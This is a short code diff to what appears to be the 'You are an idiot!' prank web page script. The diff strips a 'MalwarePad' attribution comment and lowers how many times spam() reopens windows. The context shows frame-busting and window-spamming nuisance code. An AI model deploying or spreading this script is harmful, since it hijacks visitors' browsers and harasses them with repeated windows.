@@ -1,6 +1,3 @@
-/* 
-    * Written by MalwarePad https://malwarepad.com
-*/
 
 if (top.location != location) {
   top.location.href = location.href;
@@ -13,7 +10,7 @@ function reopen() {
   );
 }
 function spam() {
-  for (var i = 0; i < 10; i++) {
+  for (var i = 0; i < 2; i++) {
     reopen();
   }
   return "You are an idiot!";
